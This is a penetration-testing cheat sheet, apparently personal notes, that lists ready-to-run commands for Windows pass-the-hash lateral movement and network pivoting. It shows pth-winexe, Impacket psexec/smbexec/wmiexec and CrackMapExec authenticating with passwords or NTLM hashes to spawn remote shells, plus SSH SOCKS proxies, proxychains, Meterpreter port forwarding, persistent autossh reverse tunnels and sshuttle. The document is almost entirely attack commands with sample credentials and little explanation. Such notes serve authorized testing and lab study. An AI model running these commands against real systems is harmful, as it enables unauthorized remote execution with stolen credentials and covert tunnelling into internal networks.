### Passing The Hash
Largely taken from these posts...

https://www.toshellandback.com/2017/02/11/psexec/

https://blog.ropnop.com/practical-usage-of-ntlm-hashes/

Several ways and tools you can run psexec or use hashes here are some syntax examples...

##### pth-toolkit
git clone https://github.com/byt3bl33d3r/pth-toolkit
```
pth-winexe -U cscou/kbryant%asdfasd21341241234asdasd:23423sdfasdf1234  //ordws01.cscou.lab cmd.exe
```
##### Impacket 
https://github.com/CoreSecurity/impacket
```
psexec.py Administrator:password!@10.10.10.10
psexec.py WEST/spice1:eastbayg@10.10.10.10 
psexec.py Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
smbexec.py WEST/spice1:eastbayg@10.10.10.10 (doesnt drop a binary)
wmiexec.py WEST/blegit:valleyho@10.10.10.10
```
##### CrackMapExec
https://github.com/byt3bl33d3r/CrackMapExec
```
crackmapexec.py 10.10.10.0/24 -d CSCOU -u jarrieta -p nastyCutt3r -x whoami
crackmapexec.py 10.10.10.0/24 -u kbryant -H 24cf234234908098092834234234
crackmapexec 10.10.10.10 -u Administrator -p crappass --shares
```
##### Nmap
```
nmap -sU -sS --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p U:137,T:139 <host>
```
##### Rdesktop
```
apt-get install freerdp-x11
xfreerdp /u:crap /d:win2012 /pth:HASH /v:IP
```

### Port Forwarding 

##### SOCKS Proxy
```
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```
##### Proxychains
Config file: /etc/proxychains.conf
```
[ProxyList]
socks4 localhost 8080
```
Set the SOCKS4 proxy then proxychains nmap 192.168.5.6
 
##### Meterpreter portfwd
 https://www.offensive-security.com/metasploit-unleashed/portfwd/
 forward remote port to local address
```
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389
```
##### SSH pivots from one network to another
```
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
```
##### Remote Port Forwarding
```
ssh -R 9000:localhost:8001 username@hostname
ssh -R 2222:localhost:22 username@hostname - SSH
ssh -R 2223:localhost:5902 username@hostname - VNC
autossh -M 20000 -f -R 2222:localhost:80 username@hostname
```
##### SShuttle
https://sshuttle.readthedocs.io/en/stable/usage.html

To sshuttle into an internal network and forward all traffic
```
sshuttle -r user@10.10.10.10 10.1.1.0/24 -vNH
```

##### References
https://chryzsh.gitbooks.io/pentestbook/content/port_forwarding_and_tunneling.html

https://blog.ropnop.com/

https://www.toshellandback.com/


